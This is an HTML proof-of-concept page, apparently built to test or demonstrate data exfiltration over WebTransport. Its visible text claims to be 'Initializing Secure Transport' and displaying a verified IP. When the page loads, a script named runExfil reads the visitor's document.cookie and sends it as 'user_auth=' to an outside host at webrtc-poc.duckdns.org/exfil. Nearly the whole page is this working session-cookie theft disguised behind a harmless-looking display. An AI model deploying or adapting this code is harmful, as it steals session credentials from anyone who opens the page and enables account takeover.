<!DOCTYPE html>
<html>
<head>
    <title>WebTransport PoC</title>
</head>
<body>
    <h1>Initializing Secure Transport...</h1>
    <div><strong>Your Verified GCE IP:</strong> <span id="ip-display">Awaiting Server Ack...</span></div>
    <hr>

    <script>
        async function runExfil() {
            const url = 'https://webrtc-poc.duckdns.org/exfil';
            
            try {
                const transport = new WebTransport(url);
                console.log("> [1] Connecting to HTTP/3 Server...");
                
                await transport.ready;
                console.log("> [2] WebTransport Session Established");

                // 1. Open the bidirectional stream object
                const stream = await transport.createBidirectionalStream();
                
                // FIX: Access the .writable and .readable properties directly from the stream object
                const writer = stream.writable.getWriter();
                const reader = stream.readable.getReader();

                // 2. Prepare and encode payload
                const data = "user_auth=" + (document.cookie || "SESSION_EXPIRED_OR_EMPTY");
                const encoded = new TextEncoder().encode(data);
                
                // 3. Send the data to the server
                await writer.write(encoded);
                await writer.close(); 
                console.log("> [3] Data transmitted. Waiting for server echo...");

                // 4. Read the incoming IP acknowledgment from the server
                const { value, done } = await reader.read();
                if (value) {
                    const decodedResponse = new TextDecoder().decode(value);
                    console.log(`> [SERVER ACK] ${decodedResponse}`);
                    
                    // Parse out the IP from the server's custom text string
                    const serverIp = decodedResponse.replace("ACK_IP:", "");
                    document.getElementById('ip-display').innerText = serverIp;
                }
                
            } catch (e) {
                console.error("WebTransport Error:", e);
                document.getElementById('ip-display').innerText = "Connection Failed";
            }
        }

        window.onload = runExfil;
    </script>
</body>
</html>
